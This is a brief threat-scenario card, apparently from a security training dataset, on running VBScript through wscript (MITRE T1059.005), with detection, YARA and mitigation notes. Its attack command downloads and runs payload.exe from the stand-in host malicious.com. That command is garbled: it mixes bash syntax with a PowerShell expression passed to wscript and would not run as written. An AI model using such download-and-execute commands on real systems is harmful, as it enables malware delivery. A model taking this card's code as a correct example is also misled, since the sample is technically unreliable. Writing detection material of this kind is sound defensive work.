---
type: campaign
scenario_id: 9
tactic: Execution
technique: "T1059.005: Visual Basic"
technique_id: T1059.005
tags: [campaign, lotl, execution]
---

# Executing VBScript via wscript to download and run payload.

## Threat Description
Executing VBScript via wscript to download and run payload.

## Attack Command
```
wscript //B $(echo script$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).vbs) "(New-Object Net.WebClient).DownloadFile('http://malicious.com/payload.exe', 'payload.exe'); Start-Process 'payload.exe'"
```

## Detection Logic
Monitor wscript execution: `wmic process where name='wscript.exe' get commandline`; YARA rule: `rule VBScriptExec { strings: $a = /wscript.*DownloadFile/ nocase; condition: $a }`

## Mitigation
Disable wscript: `reg add HKLM\Software\Microsoft\Windows\Script Host\Settings /v Enabled /t REG_DWORD /d 0`; Restrict VBS execution: AppLocker.

## AI Training Prompt
Train AI to detect VBScript execution and suggest script host restrictions.

## References
- MITRE ATT&CK T1059.005: https://attack.mitre.org/techniques/T1059/005/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
